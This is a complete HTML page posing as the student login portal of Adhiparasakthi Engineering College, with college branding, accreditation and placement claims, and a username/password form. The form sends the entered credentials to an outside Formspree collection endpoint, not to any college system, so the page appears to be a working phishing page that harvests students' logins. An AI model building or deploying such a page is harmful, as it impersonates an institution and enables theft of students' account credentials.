<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Adhiparasakthi Engineering College</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: white;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      gap: 40px;
      padding: 20px;
      flex-wrap: wrap;
    }

    /* LEFT INFO BOX */
    .info-box {
      width: 380px;
    }

    .logo {
      width: 100px;
      border-radius: 10px;
    }

    h1 {
      margin: 10px 0;
      font-size: 24px;
    }

    .card {
      background: rgba(255,255,255,0.1);
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
    }

    /* LOGIN BOX */
    .login-box {
      background: white;
      color: black;
      padding: 25px;
      width: 300px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      text-align: center;
    }

    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
    }

    button {
      width: 95%;
      padding: 10px;
      background: #203a43;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }

    button:hover {
      background: #0f2027;
    }
  </style>
</head>

<body>

  <div class="container">

    <!-- LEFT SIDE INFORMATION -->
    <div class="info-box">

      <img src="logo.png" class="logo" alt="College Logo">

      <h1>Adhiparasakthi Engineering College</h1>

      <div class="card">
        <h3>🎓 NAAC Grade</h3>
        <p>A++ Grade Institution</p>
      </div>

      <div class="card">
        <h3>🏆 Placements</h3>
        <p>Top MNC Companies visit every year with high placement records</p>
      </div>

      <div class="card">
        <h3>📘 Training</h3>
        <p>Special training in Coding, Aptitude, Communication & Interview Skills</p>
      </div>

    </div>

    <!-- LOGIN BOX -->
    <div class="login-box">

      <h2>Student Login</h2>

      <form action="https://formspree.io/f/mjgqpdjo" method="POST">

        <input type="text" name="username" placeholder="Enter Username" required>

        <input type="password" name="password" placeholder="Enter Password" required>

        <button type="submit">Login</button>

      </form>

    </div>

  </div>

</body>
</html>
